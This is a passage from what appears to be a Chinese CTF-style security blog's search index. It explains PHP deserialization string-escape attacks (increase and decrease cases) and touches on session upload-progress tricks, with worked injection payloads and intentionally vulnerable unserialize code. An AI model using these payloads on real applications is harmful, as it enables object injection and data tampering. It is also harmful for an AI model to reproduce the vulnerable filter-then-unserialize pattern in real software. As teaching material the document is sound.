class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$her</span>;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Flag</span>();<br><span class="hljs-variable">$a</span>-&gt;name=&amp;<span class="hljs-variable">$a</span>-&gt;her;<br><span class="hljs-keyword">echo</span>  <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h1 id="没有-SESSION变量赋值的情况"><a href="#没有-SESSION变量赋值的情况" class="headerlink" title="没有$_SESSION变量赋值的情况"></a>没有$_SESSION变量赋值的情况</h1><p>当session.upload_progress.enable 开启时，当上传一个文件时，会对文件上传进度进行一个监测。</p><p>官方来讲就是：当 <a href="http://php.net/manual/zh/session.configuration.php#ini.session.upload-progress.enabled">session.upload_progress.enabled</a> INI 选项开启时，PHP 能够在每一个文件上传时监测上传进度。 这个信息对上传请求自身并没有什么帮助，但在文件上传时应用可以发送一个POST请求到终端（例如通过XHR）来检查这个状态。</p><p>当一个上传在处理中，同时POST一个与INI中设置的<a href="http://php.net/manual/zh/session.configuration.php#ini.session.upload-progress.name">session.upload_progress.name</a>同名变量时，上传进度可以在<a href="http://php.net/manual/zh/reserved.variables.session.php">$_SESSION</a>中获得。 当PHP检测到这种POST请求时，它会在<a href="http://php.net/manual/zh/reserved.variables.session.php">$_SESSION</a>中添加一组数据, 索引是<a href="http://php.net/manual/zh/session.configuration.php#ini.session.upload-progress.prefix">session.upload_progress.prefix</a> 与 <a href="http://php.net/manual/zh/session.configuration.php#ini.session.upload-progress.name">session.upload_progress.name</a>连接在一起的值。</p><p>简单的来讲就是构造一个上传表单，然后抓包，对文件名进行一个修改</p><p>表单代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;form action=<span class="hljs-string">&quot;http://example&quot;</span> method=<span class="hljs-string">&quot;POST&quot;</span> enctype=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;<br>    &lt;input type=<span class="hljs-string">&quot;hidden&quot;</span> name=<span class="hljs-string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>; <span class="hljs-meta">?&gt;</span><span class="hljs-string">&quot; value=&quot;</span><span class="hljs-number">123</span><span class="hljs-string">&quot; /&gt;</span><br><span class="hljs-string">    &lt;input type=&quot;</span>file<span class="hljs-string">&quot; name=&quot;</span>file<span class="hljs-string">&quot; /&gt;</span><br><span class="hljs-string">    &lt;input type=&quot;</span>submit<span class="hljs-string">&quot; /&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br></code></pre></td></tr></table></figure><p>可以看看这篇文章：</p><p><a href="https://www.cnblogs.com/yokan/p/12575371.html">https://www.cnblogs.com/yokan/p/12575371.html</a></p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>php反序列化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>php反序列化逃逸</title>
    <link href="/2023/08/03/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%83%E9%80%B8/"/>
    <url>/2023/08/03/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%83%E9%80%B8/</url>
    
    <content type="html"><![CDATA[<p>之前就对字符串逃逸这一块理解的不是很深刻，下面通过一位师傅的博客来进一步深入理解一下有关php字符串逃逸的相关内容。</p><p>贴上师傅的博客地址:<a href="https://blog.csdn.net/qq_45521281/article/details/107135706">https://blog.csdn.net/qq_45521281/article/details/107135706</a></p><p><strong>先来说一下什么是字符串逃逸，就是我们可以构造一些恶意代码，让其在反序列化的时候执行我们想让它执行的。在这过程中造成的字符串的增加或者减少称为字符串逃逸。</strong></p><h1 id="替换修改后导致字符串长度增加-逃逸增加"><a href="#替换修改后导致字符串长度增加-逃逸增加" class="headerlink" title="替换修改后导致字符串长度增加   (逃逸增加)"></a>替换修改后导致字符串长度增加   (逃逸增加)</h1><p>先来一个代码简单的分析一下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;bb&#x27;</span>,<span class="hljs-string">&#x27;ccc&#x27;</span>,<span class="hljs-variable">$str</span>);<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>=<span class="hljs-string">&#x27;aaaa&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$pass</span>=<span class="hljs-string">&#x27;123456&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$AA</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">A</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$AA</span>).<span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-variable">$res</span>=<span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$AA</span>));<br><span class="hljs-variable">$c</span>=<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$res</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$c</span>-&gt;pass;<br><span class="hljs-meta">?&gt;</span><br>    看它的返回结果：<br>O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;A&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;aaaa&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;pass&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;123456&quot;</span>;&#125;<br><span class="hljs-number">123456</span><br></code></pre></td></tr></table></figure><p>若我们在不直接修改pass的前提下，让pass的值变成hacker，我们该如何实现呢？<br>这里我们就用到了字符串逃逸增加来实现。</p><p>我们可以看到str_replace(‘bb’,’ccc’,$str); 意思就是在变量str中，将每两个b替换成三个c，但序列化之后的字符长度仍然按照没有被替换的。</p><p>举个例子说明一下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;bb&#x27;</span>,<span class="hljs-string">&#x27;ccc&#x27;</span>,<span class="hljs-variable">$str</span>);<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>=<span class="hljs-string">&#x27;aaaabb&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$pass</span>=<span class="hljs-string">&#x27;123456&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$AA</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">A</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$AA</span>).<span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-variable">$res</span>=<span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$AA</span>));<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$res</span>;<br><span class="hljs-meta">?&gt;</span><br>    运行的结果如下：<br>O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;A&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;aaaabb&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;pass&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;123456&quot;</span>;&#125;<br>O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;A&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;aaaaccc&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;pass&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;123456&quot;</span>;&#125;  <span class="hljs-comment">//这里我们可以看到aaaaccc明明是7个字符，但前面标的仍然是6个，这里就逃逸出来一个字符。</span><br></code></pre></td></tr></table></figure><p>根据上面的演示，我们可以进行构造代码，通过bb替换成ccc，来进行字符串的逃逸，从而让pass的值为hacker</p><p>下面是代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;bb&#x27;</span>,<span class="hljs-string">&#x27;ccc&#x27;</span>,<span class="hljs-variable">$str</span>);<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>=<span class="hljs-string">&#x27;bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&quot;;s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;&#125;&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$pass</span>=<span class="hljs-string">&#x27;123456&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$AA</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">A</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$AA</span>).<span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-variable">$res</span>=<span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$AA</span>));<br><span class="hljs-variable">$c</span>=<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$res</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$c</span>-&gt;pass;<br><span class="hljs-comment">//echo $res;</span><br><span class="hljs-meta">?&gt;</span><br>    运行的结果：<br>O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;A&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">81</span>:<span class="hljs-string">&quot;bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;pass&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;hacker&quot;</span>;&#125;<span class="hljs-string">&quot;;s:4:&quot;</span>pass<span class="hljs-string">&quot;;s:6:&quot;</span><span class="hljs-number">123456</span><span class="hljs-string">&quot;;&#125;</span><br><span class="hljs-string">hacker</span><br><span class="hljs-string">成功的实现目标。</span><br></code></pre></td></tr></table></figure><p>思想就是我们要逃逸出来的字符串是”;s:4:”pass”;s:6:”hacker”;} 总共27个字符串，也就是说需要逃逸27个字符串出来，之前是2b逃逸出来一个，那么这需要逃逸27个，也就需要54b。</p><h1 id="替换修改后导致字符串长度减少-（逃逸减少）"><a href="#替换修改后导致字符串长度减少-（逃逸减少）" class="headerlink" title="替换修改后导致字符串长度减少  （逃逸减少）"></a>替换修改后导致字符串长度减少  （逃逸减少）</h1><p>字符串逃逸减少就是字符串经过一些变化后，字符长度减少，原来的功能性代码变成普通的字符串，然后我们可以利用逃逸进行构造一些恶意的代码。</p><p>下面来一个例子看一下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">str_rep</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/php|test/&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$string</span>);<br>&#125;<br><span class="hljs-variable">$test</span>[<span class="hljs-string">&#x27;name&#x27;</span>]=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<br><span class="hljs-variable">$test</span>[<span class="hljs-string">&#x27;sign&#x27;</span>]=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;sign&#x27;</span>];<br><span class="hljs-variable">$test</span>[<span class="hljs-string">&#x27;number&#x27;</span>]=<span class="hljs-string">&#x27;2020&#x27;</span>;<br><span class="hljs-variable">$temp</span>=<span class="hljs-title function_ invoke__">str_rep</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$test</span>));<br><span class="hljs-title function_ invoke__">printf</span>(<span class="hljs-variable">$temp</span>);<br><span class="hljs-variable">$fake</span>=<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$temp</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br><span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;name:&quot;</span>.<span class="hljs-variable">$fake</span>[<span class="hljs-string">&#x27;name&#x27;</span>].<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>);<br><span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;sign:&quot;</span>.<span class="hljs-variable">$fake</span>[<span class="hljs-string">&#x27;sign&#x27;</span>].<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>);<br><span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;number:&quot;</span>.<span class="hljs-variable">$fake</span>[<span class="hljs-string">&#x27;number&#x27;</span>].<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>代码都是上面师傅里面演示的，这里我是根据自己的理解来讲一下。</p><p>把这段代码放在本地，可以看到结果为：</p><p><img src="https://s2.loli.net/2023/08/18/Y2h8jRxIf5QKi3y.png" alt="image-20230523212438734.png"></p><p>这里可以看到name和sign里面都是没有内容的，所以这里是N。</p><p>然后我们看到代码中的str_rep()函数，是将变量string中的php和test替换成空。</p><p>然后下面有一个经过这段函数的反序列化，这里就构成了反序列化逃逸减少的漏洞。</p><p>反序列化逃逸减少不同于增加。</p><p>增加是看要构造的恶意代码字符串长度是多少，就举一个例子，如果匹配到了bb,函数是把它替换成ccc，那么就相当于每一个bb可以逃逸出1个字符，如果我们要构造的恶意代码长度是27位，那么我们就需要54个bb。</p><p>而减少我个人感觉是比增加复杂一点，但也不多。拿上面的代码进行演示，如果我想让sign的值是eval，并且数字改成2023，那么这就利用到了字符串逃逸减少。</p><p>首先构造我们要实现的目标。”;s:4:”sign”;s:4:”eval”;s:6:”number”;s:4:”2023”;}  </p><p>减少逃逸是让一些功能性代码变成字符串，这里是让sign变成字符串，而后面构造的sign和number则成为新的功能性代码。</p><p>“;s:4:”sign”;s:xx:”前面的字符一共有19个，我们有两种方法，一种是利用php，另外一种是利用test只不过都需要填充字符罢了   “;s:4:”sign”;s:4:”eval”;s:6:”number”;s:4:”2023”;} </p><p>“;s:4:”sign”;s:xx:”这里是需要填充的字符”;s:4:”sign”;s:4:”eval”;s:6:”number”;s:4:”2023”;} </p><p>如果用7个php，也就是可以逃逸21个，上面是19个，那么我们可以填充2个字符。</p><p>如果用5个test,逃逸20个，需要填充一个字符。</p><p><img src="https://s2.loli.net/2023/08/18/Y2h8jRxIf5QKi3y.png" alt="image-20230523212438734.png"></p><p><img src="https://s2.loli.net/2023/08/18/NeRMEVlk6cOAqYr.png" alt="image-20230523220226399.png">结果如上。</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>php反序列化</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
